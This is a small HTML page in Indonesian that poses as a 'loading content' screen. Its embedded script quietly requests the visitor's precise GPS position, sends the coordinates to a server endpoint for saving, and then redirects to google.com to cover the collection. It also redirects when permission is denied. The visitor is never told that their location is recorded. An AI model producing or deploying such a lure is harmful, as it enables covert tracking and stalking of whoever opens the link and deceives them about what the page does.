<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Memuat Halaman...</title>
</head>
<body>
    <p style="text-align:center; margin-top:20%">Memuat konten, mohon tunggu...</p>
    <script>
        async function sendLocation(lat, lon) {
            try {
                await fetch('/api/save-locations', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat, lon })
                });
            } catch (err) {
                console.error("Gagal mengirim:", err);
            }
            // Redirect ke Google setelah selesai dikirim
            window.location.href = "https://google.com";
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    sendLocation(position.coords.latitude, position.coords.longitude);
                },
                (error) => {
                    // Jika pengguna menolak izin GPS, tetap redirect
                    window.location.href = "https://google.com";
                },
                { timeout: 10000, enableHighAccuracy: true }
            );
        } else {
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
